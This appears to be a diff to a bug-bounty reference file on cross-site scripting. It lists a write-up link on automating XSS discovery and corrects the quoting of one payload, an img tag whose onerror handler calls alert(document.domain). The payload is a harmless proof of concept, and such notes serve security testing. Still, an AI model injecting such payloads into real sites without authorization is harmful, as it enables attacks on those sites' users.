@@ -10,5 +10,5 @@ WriteUps
 - https://medium.com/bugbountywriteup/automating-xss-using-dalfox-gf-and-waybackurls-bc6de16a5c75
 
 PayLoads
-- "><img src=x onerror="alert(document.domain)>
+- "><img src=x onerror=alert(document.domain)>
 
